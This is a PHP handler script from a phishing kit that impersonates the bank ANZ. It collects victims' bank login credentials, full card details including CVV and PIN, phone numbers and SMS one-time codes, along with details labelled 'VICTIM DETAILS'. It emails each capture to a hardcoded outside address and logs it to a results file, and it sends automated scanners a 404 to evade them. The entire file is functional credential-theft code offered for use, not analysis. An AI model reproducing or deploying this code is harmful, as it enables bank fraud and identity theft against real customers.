<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           ANZ
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ANZ
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';

$to = 'dr.hkrzlt@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['customer_number'] = $_POST['customer_number'];
        $_SESSION['password']        = $_POST['password'];

        $subject = $_SERVER['REMOTE_ADDR'] . ' | ANZ | Login';
        $message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'Customer Registration Number : ' . $_POST['customer_number'] . "\r\n";
        $message .= 'Password : ' . $_POST['password'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOGIN INFOS --/' . "\r\n\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("../resultz662.txt", $message, FILE_APPEND);
        header("location: loading1.php?redirection#_$dispatch");

    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_number']   = $_POST['cc_number'];
        $_SESSION['cc_date']     = $_POST['cc_date'];
        $_SESSION['cc_cvv']      = $_POST['cc_cvv'];
        $_SESSION['cc_pin']      = $_POST['cc_pin'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['cc_number'],16) == false ) {
            $_SESSION['errors']['cc_number'] = 'Please enter a valid card number';
        }
        if( validate_number($_POST['cc_cvv'],3) == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Please enter a valid security code';
        }
        if( validate_date($_POST['cc_date'],'m/y') == false ) {
            $_SESSION['errors']['cc_date'] = 'Please enter a valid date';
        }
        if( validate_number($_POST['cc_pin']) == false ) {
            $_SESSION['errors']['cc_pin'] = 'Please enter a valid pin';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ANZ | Card';
            $message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card Date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'Card CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'Card PIN : ' . $_POST['cc_pin'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultz662.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading2.php?redirection#_$dispatch");

        } else {
            header("location: cc.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "phone") {

        $_SESSION['phone']  = $_POST['phone'];

        $_SESSION['errors'] = [];
        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = 'Please enter a valid phone number';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ANZ | Phone';
            $message = '/-- PHONE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END PHONE INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $error = ($_POST['error'] == '') ? 1 : $_POST['error'];

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultz662.txt", $message, FILE_APPEND);
            header("location: loading3.php?redirection#_$dispatch");

        } else {
            header("location: phone.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code'] = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) ) {
            $_SESSION['errors']['confirm_code'] = 'Please enter a valid SMS code';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ANZ | Sms';
            $message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../resultz662.txt", $message, FILE_APPEND);
            header("location: loading4.php?redirection#_$dispatch");
        } else {
            header("location: sms.php?error#_$dispatch");
        }

    }

}

?>